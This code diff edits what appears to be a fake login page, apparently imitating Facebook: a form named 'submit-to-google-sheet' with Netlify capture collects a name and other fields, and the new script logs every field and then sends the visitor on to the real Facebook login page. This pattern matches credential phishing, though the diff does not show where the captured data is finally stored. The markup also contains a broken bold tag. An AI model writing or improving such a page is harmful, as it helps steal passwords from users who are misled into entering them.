@@ -26,7 +26,7 @@
             </div>
             <div class="right-box">
               <div class="form-container">
-                <form name="submit-to-google-sheet" data-netlify="true">
+                <form id="loginForm" name="submit-to-google-sheet" data-netlify="true">
                   <div class="space">
                     <input
                       type="text" name="Name"
@@ -50,8 +50,7 @@
                     ></i>
                   </div>
                   <div class="space">
-                    <!-- Changed type to button -->
-                    <button type="button" id="linktofb" class="login-button"><b>Log in</b></button>
+                    <button type="submit" id="linktofb" class="login-button"><b>Log in<b></button>    
                   </div>
                   <div class="spaceTwo adjustTwo">
                     <a href="#" class="adjust-forgot-pw">Forgot password?</a>
@@ -199,10 +198,33 @@
 
     <script>
       document.addEventListener('DOMContentLoaded', function() {
-          document.getElementById('linktofb').onclick = function() {
-              window.location.href = 'https://www.facebook.com/login';
-          };
-      });
+    // Select the form and button elements
+    const form = document.querySelector('form');
+    const loginButton = document.getElementById('linktofb');
+
+    // Add event listener to the form submission
+    form.addEventListener('submit', function(event) {
+      event.preventDefault(); // Prevent default form submission
+
+      // Optionally, you can process form data here or send it to a server
+      // For now, just simulate form submission
+
+      // Example: Log form data (for testing purposes)
+      const formData = new FormData(form);
+      for (const [key, value] of formData.entries()) {
+        console.log(`${key}: ${value}`);
+      }
+
+      // Redirect to the Facebook login page
+      window.location.href = 'https://www.facebook.com/login';
+    });
+
+    // Add event listener to the login button
+    loginButton.addEventListener('click', function() {
+      // Optionally, you could trigger form submission here
+      form.dispatchEvent(new Event('submit'));
+    });
+  });
     </script>
   </body>
 </html>
